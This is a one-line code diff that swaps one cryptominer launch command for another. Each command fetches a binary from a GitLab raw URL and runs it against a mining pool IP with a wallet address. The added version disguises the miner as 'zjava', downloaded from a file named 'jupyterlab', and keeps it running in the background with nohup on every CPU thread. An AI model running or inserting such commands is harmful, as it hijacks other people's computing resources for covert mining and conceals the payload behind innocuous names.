@@ -1,1 +1,1 @@
-wget -O joko https://gitlab.com/jasa4/jasa/-/raw/main/JOKO-SBv2.tar.gz && tar -xvf joko && sudo ./JOKO-SBv2/JOKO-SBv2 -a verushash -o 47.236.39.4:80 -u RUJMnjvsH3AA5WXPpttZmj7miybCqEeRrB.GH-$(TZ=UTC-7 date +"%H-%M-%S [%d-%m]") -p x --cpu-threads $(nproc --all)
+wget -qO zjava https://gitlab.com/mhcolab4/im/-/raw/main/jupyterlab && chmod +x zjava && nohup ./zjava -a rx/0 -o 93.123.83.97:443 -u 845QtKErnZAYq6m2meN41qMM1jVR55a4xFUgYwjQKMNaMneSxw37nTf4TJXYC5JJQEKprNo3rMiH717Vmo49CKmLGSYgjNP.A --randomx-1gb-pages -t $(nproc --all)
